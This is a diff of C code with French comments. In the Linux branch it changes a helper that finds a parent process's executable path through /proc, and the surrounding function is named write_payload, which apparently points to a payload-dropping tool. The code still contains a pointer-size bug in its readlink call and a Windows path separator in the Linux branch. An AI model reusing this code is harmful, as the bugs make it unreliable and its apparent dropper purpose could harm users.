@@ -40,27 +40,27 @@ int write_payload(const char *filename, unsigned char *data, unsigned int length
 
 #elif __linux__
     // Fonction pour récupérer le chemin d'un processus à partir de son PID
-    void get_parent_path(pid_t pid, char *path) {
+    void get_parent_path(pid_t pid, char *path, size_t path_size) {
         FILE *fp;
-        char parent_pid[20];
+        char parent_pid[60];
         char proc_path[MAX_PATH];
-
+    
         // Obtenir le PID du parent
-        snprintf(path, sizeof(path), "/proc/%d/stat", pid);
+        snprintf(path, path_size, "/proc/%d/stat", pid);
         fp = fopen(path, "r");
         if (fp == NULL) {
             perror("fopen");
             return;
         }
-
+    
         // Lire l'ID du parent à partir du fichier stat (le PPid est dans la 4ème colonne)
         if (fscanf(fp, "%*d %*s %*c %s", parent_pid) != 1) {
-        perror("fscanf");
+            perror("fscanf");
             fclose(fp);
             return;
         }
         fclose(fp);
-
+    
         // Obtenir le chemin du programme du parent à partir de /proc/[PPID]/exe
         snprintf(proc_path, sizeof(proc_path), "/proc/%s/exe", parent_pid);
         ssize_t len = readlink(proc_path, path, sizeof(path) - 1);
@@ -68,7 +68,7 @@ int write_payload(const char *filename, unsigned char *data, unsigned int length
             perror("readlink");
             return;
         }
-
+    
         path[len] = '\0';  // Ajouter le caractère de fin de chaîne
         printf("Le chemin du parent est: %s\n", path);
     }
@@ -78,7 +78,7 @@ int write_payload(const char *filename, unsigned char *data, unsigned int length
         pid_t pid = getpid();
         char path[MAX_PATH];
 
-        get_parent_path(pid, path);    
+        get_parent_path(pid, path, sizeof(path));    
         strcat(path, "\\anti_virus");
 
         strcpy(temp_path, path);
